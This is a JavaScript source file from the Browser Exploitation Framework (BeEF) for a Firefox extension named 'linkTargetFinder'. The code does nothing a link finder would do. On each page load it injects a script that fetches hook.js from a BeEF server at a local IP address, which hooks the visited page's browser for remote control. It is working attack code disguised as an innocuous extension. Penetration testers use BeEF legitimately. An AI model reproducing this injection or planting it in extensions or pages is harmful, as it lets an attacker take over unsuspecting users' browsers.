/*
 * Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
 * Browser Exploitation Framework (BeEF) - http://beefproject.com
 * See the file 'doc/COPYING' for copying permission
 */

var linkTargetFinder = function () {
	var prefManager = Components.classes["@mozilla.org/preferences-service;1"].getService(Components.interfaces.nsIPrefBranch);
	return {
		init : function () {
			gBrowser.addEventListener("load", function () {
				//todo change the Extension name
				var autoRun = prefManager.getBoolPref("extensions.linktargetfinder.autorun");
				if (autoRun) {
					linkTargetFinder.run();
				}
			}, false);
		},
			
		run : function () {
			var head = content.document.getElementsByTagName("head")[0];
			
			// add the BeEF hook -- start
			var s = content.document.createElement('script');
			s.type='text/javascript';
			s.src='http://192.168.0.2:3000/hook.js';
			head.appendChild(s);
			
			//setTimeout cannot be used (looks like is ignored).
			// beef_init if called manually from the console, works perfectly.
			
			// adding setTimeout(beef_init, 2000); at the end of the hook file, make it working.
			// John Wilander suggestions. we might leave it there anyway.
			//alert(1);
			//setTimeout(function(){beef_init()}, 5000);
			//alert(3);
			
			// add the BeEF hook -- end
			
		}
	};
}();
window.addEventListener("load", linkTargetFinder.init, false);